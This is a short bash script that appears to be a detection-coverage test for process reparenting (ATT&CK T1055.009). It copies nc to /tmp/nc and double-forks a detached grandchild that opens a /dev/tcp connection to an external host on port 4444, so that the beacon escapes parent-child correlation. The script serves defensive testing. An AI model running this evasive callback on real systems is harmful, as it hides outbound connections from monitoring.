#!/usr/bin/env bash
# T1055.009 (Tier B) — a suspicious parent double-forks so the acting child is
# REPARENTED (its original parent exits). Historically breaks pid-join correlation;
# P0-1's recently-exited window may partially attribute it. Expected miss; a hit is
# scored GAP_CLOSED.
set -eu
host="${SINK_EXTERNAL:-203.0.113.10}"
port="${SINK_PORT:-4444}"
src="$(command -v nc || command -v xxd || command -v base64)"
cp -f "$src" /tmp/nc && chmod +x /tmp/nc
# /tmp/nc spawns a detached (setsid) grandchild that connects, then the parent exits
# immediately → the grandchild is reparented before it beacons.
timeout 6 /tmp/nc -c "setsid bash -c 'sleep 1; timeout 3 bash -c \"exec 3<>/dev/tcp/${host}/${port}\" 2>/dev/null' & exit 0" 2>/dev/null || true
sleep 3
